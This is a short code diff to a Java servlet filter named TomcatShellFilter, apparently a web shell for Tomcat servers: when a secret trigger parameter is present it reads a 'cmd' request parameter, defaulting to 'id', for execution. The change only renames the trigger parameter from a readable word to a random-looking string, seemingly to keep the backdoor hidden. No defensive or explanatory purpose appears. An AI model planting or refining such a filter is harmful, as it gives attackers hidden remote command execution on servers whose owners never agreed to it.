@@ -18,7 +18,7 @@ public class TomcatShellFilter implements Filter {
 
     @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
-        boolean success = request.getParameter("xhstormr") != null;
+        boolean success = request.getParameter("34aa503f95bb") != null;
         String cmd = Optional.ofNullable(request.getParameter("cmd")).orElse("id");
 
         if (success) {
